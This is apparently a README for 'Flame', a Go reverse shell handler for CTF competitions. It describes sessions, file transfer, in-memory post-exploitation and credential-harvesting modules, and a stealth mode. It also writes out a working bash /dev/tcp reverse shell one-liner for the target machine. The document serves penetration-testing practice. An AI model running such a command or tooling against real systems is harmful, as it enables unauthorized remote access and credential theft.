# Flame

A modern reverse shell handler for CTF competitions, written in Go. Inspired by [Penelope](https://github.com/brightio/penelope) with enhanced features and a polished CLI.

## Features

- **Multi-session management** — Handle multiple reverse shells simultaneously
- **Automatic PTY upgrade** — Linux shells get a proper TTY automatically
- **Windows PowerShell support** — Full readline-based interactive shell
- **File transfers** — HTTP (blazing fast) or base64 chunking fallback, with MD5 verification
- **Module system** — LinPEAS, WinPEAS, PowerUp, PowerView, LaZagne, pspy, and more
- **In-memory execution** — Run scripts and .NET assemblies without touching disk
- **Binbag integration** — Local HTTP file server for instant tool deployment
- **SSH automation** — Connect via SSH and auto-inject reverse shell
- **Payload generation** — Bash, Base64, and PowerShell reverse shell payloads
- **Session logging** — Automatic I/O logging per session
- **Beautiful CLI** — Lipgloss styling, Bubble Tea confirmations, animated spinners

## Quick Start

```bash
# Build
go build -o flame

# Start listener on a network interface
./flame -i tun0 -p 4444

# Or with a direct IP
./flame -ip 10.10.14.5 -p 4444
```

On the target machine:

```bash
bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
```

Back in flame:

```
 Reverse shell received on session 1 (10.10.11.123)

󰗣 flame ❯ use 1
󰗣 flame [1] ❯ shell
# You're now in a fully upgraded PTY shell!
```

## Commands

| Command | Description |
|---------|-------------|
| `list` / `sessions` | List active sessions |
| `use <id>` | Select a session |
| `shell` | Enter interactive shell (F12 to exit) |
| `upload <local> [remote]` | Upload file to target |
| `download <remote> [local]` | Download file from target |
| `modules` | List available modules |
| `run <module> [args]` | Run a module |
| `spawn` | Spawn new shell from current session |
| `rev` | Generate reverse shell payloads |
| `ssh user@host` | SSH + auto reverse shell |
| `config` | Show/save configuration |
| `set <option> <value>` | Change runtime settings |
| `help` | Show all commands |

## Modules

### Linux

| Module | Command | Mode | Description |
|--------|---------|------|-------------|
| LinPEAS | `run peas` | In-memory | Privilege escalation scanner |
| LSE | `run lse` | In-memory | Linux Smart Enumeration |
| Loot | `run loot` | In-memory | Post-exploitation (creds, keys) |
| pspy | `run pspy` | Disk + cleanup | Process monitor without root |

### Windows

| Module | Command | Mode | Description |
|--------|---------|------|-------------|
| WinPEAS | `run winpeas` | In-memory (.NET) | Privilege escalation scanner |
| PowerUp | `run powerup` | In-memory (PS1) | Privilege escalation checker |
| PowerView | `run powerview` | In-memory (PS1) | AD enumeration functions |
| LaZagne | `run lazagne` | Disk + cleanup | Credential harvester |

### Generic

| Module | Command | Mode | Description |
|--------|---------|------|-------------|
| ELF Binary | `run elf <source>` | Disk + cleanup | Run any Linux/native Unix binary from URL or binbag |
| Shell Script | `run sh <url>` | In-memory | Run any bash script |
| PowerShell | `run ps1 <url>` | In-memory | Run any PS1 script |
| .NET | `run dotnet <url>` | In-memory | Run any .NET assembly |
| Python | `run py <url>` | In-memory | Run any Python script |
| Privesc | `run privesc` | Disk | Bulk upload privesc tools |

## Configuration

Flame uses `~/.flame/config.toml` for persistent settings:

```bash
# Enable binbag (local HTTP file server for fast transfers)
set binbag ~/Lab/binbag

# Switch execution mode
set mode stealth    # In-memory execution (default)
set mode speed      # Disk-based execution

# Save settings to config file
config save
```

## Documentation

See the [`docs/`](docs/) directory for detailed guides:

- [Sessions & Shell](docs/sessions.md) — Session management, PTY upgrade, Windows shells
- [File Transfers](docs/transfers.md) — Upload, download, HTTP mode, base64 fallback
- [Modules](docs/modules.md) — Built-in modules, custom modules, execution modes
- [Configuration](docs/configuration.md) — Binbag, execution modes, pivot support

## Requirements

- Go 1.21+
- A terminal with [Nerd Fonts](https://www.nerdfonts.com/) for best experience (optional, degrades gracefully)

## Project Structure

```
flame/
├── main.go              # Entry point, CLI flags
├── internal/
│   ├── listener.go      # TCP listener
│   ├── session.go       # Multi-session manager, menu system
│   ├── shell.go         # Shell I/O (PTY + readline modes)
│   ├── pty.go           # PTY upgrade system
│   ├── transfer.go      # File transfers (HTTP + b64)
│   ├── modules.go       # Module system
│   ├── config.go        # TOML configuration
│   ├── runtime_config.go# Thread-safe runtime config
│   ├── fileserver.go    # HTTP file server
│   ├── ssh.go           # SSH automation
│   ├── payloads.go      # Reverse shell payloads
│   ├── netutil.go       # Network utilities
│   ├── downloader.go    # HTTP downloader
│   ├── terminal.go      # Terminal opener
│   └── ui/
│       ├── colors.go    # Lipgloss styling
│       └── spinner.go   # Animated spinners
└── docs/                # Documentation
```

## License

Educational use for CTF competitions only.
